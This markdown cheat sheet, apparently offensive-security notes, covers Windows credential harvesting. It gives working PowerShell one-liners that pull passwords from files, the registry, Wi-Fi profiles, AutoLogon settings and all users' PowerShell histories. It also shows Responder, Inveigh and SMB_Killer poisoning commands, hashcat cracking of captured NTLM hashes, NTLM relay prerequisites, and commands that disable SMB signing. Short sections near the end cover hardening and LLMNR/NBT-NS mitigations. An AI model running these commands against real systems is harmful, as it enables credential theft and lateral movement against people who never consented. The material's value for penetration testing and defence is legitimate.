# Credential Harvesting

## Table of Contents

- [Local Credential Search](#local-credential-search)
- [Network Capture and Poisoning](#network-capture-and-poisoning)
- [NTLM Relay](#ntlm-relay)
- [SMB Signing](#smb-signing)
- [Mitigations for LLMNR/NBT-NS Poisoning](#mitigations-for-llmnrnbt-ns-poisoning)

## Local Credential Search

### Search starting at C:\ for files that may contain passwords
```powershell
Get-ChildItem -Path C:\ -Include *.txt,*.xml,*.ini,*.config,*.bat -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password", "pwd", "pass" | Select Path, LineNumber, Line
```

### Search Registry for stored passwords
```powershell
Get-ChildItem -Path HKLM:\, HKCU:\ -Recurse -ErrorAction SilentlyContinue | Get-ItemProperty -ErrorAction SilentlyContinue | Where-Object { $_ -match "password" }
```

### Wi-Fi Passwords
```powershell
netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { ($_.ToString().Split(":")[1].Trim()) } | ForEach-Object { Write-Host "`nProfile: $_" -ForegroundColor Cyan; (netsh wlan show profile name="$_" key=clear | Select-String "Key Content") -replace '.*:','Password: ' }
```

### AutoLogon in Registry
```powershell
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | Select-Object DefaultUsername, DefaultPassword, AutoAdminLogon
```

### PowerShell history for all users
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

## Network Capture and Poisoning

### SMB_Killer + responder
1. Download SMB_Killer from
[https://github.com/overgrowncarrot1/SMB_Killer]
2. sample usage for SMB_Killer.py
```bash
python3 SMB_Killer.py -l 192.168.12.150 -r 192.168.12.145 -d simply.cyber -a common -A -i eth0
```
3. If SMB signing it Turned Off we can do NTLM-Relay

#### Responder Can also poison the request to non Existing Shares and Capture the hashes

### Sniffing for foothold

- Using `responder.py` from Linux attacking host
```bash
sudo responder -I <Interface-Name> -wfv
```

- Using `Inviegh.ps1` from Windows machine
```powershell
Import-Module .\Inveigh.ps1
(Get-Command Invoke-Inveigh).Parameters
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

- Cracking them Offline
```bash
hashcat -m 5600 svc_qualys.hash /usr/share/wordlists/rockyou.txt
```

## NTLM Relay

using impacket tools like NTLMRelayX, we can Capture NTLM Auth requests requests and relay them to another targets, but for this to happen we need to make sure that:

- SMB Signing is Disabled **(Signing False)**
- The user that we are relaying his NTLM auth request **MUST be an admin on the TARGET MACHINE**

## SMB Signing

### Enabling Signing and SMBv2
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "EnableSecuritySignature" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "EnableSecuritySignature" -Value 1
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 1
# Disable SMBv1
Disable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol" -Remove
# Verify SMBv2/3 is enabled (default in Windows 8+ / Server 2012+)
Set-SmbServerConfiguration -EnableSMB2Protocol $true -Force
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
# Restart services to apply changes
Restart-Service -Name "LanmanServer" -Force
Restart-Service -Name "LanmanWorkstation" -Force
```

### Disabling Signing and turning SMBv1 ON
```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "EnableSecuritySignature" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" -Name "RequireSecuritySignature" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "EnableSecuritySignature" -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters" -Name "RequireSecuritySignature" -Value 0
```

### Disable / Enable SMB signing
```powershell
#To turn off SMB Signing
Set-SmbServerConfiguration -RequireSecuritySignature $false
Set-SmbClientConfiguration -RequireSecuritySignature $false
```
```powershell
#To turn on SMB Signing
Set-SmbServerConfiguration -RequireSecuritySignature $true
Set-SmbClientConfiguration -RequireSecuritySignature $true
```

## Mitigations for LLMNR/NBT-NS Poisoning

#### Mitre ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.

1. Disable LLMNR/NTB-NS protocols, But first they should be tested if this would cause failure in any systems
2. Monitor the traffic on the Ports for both protocols
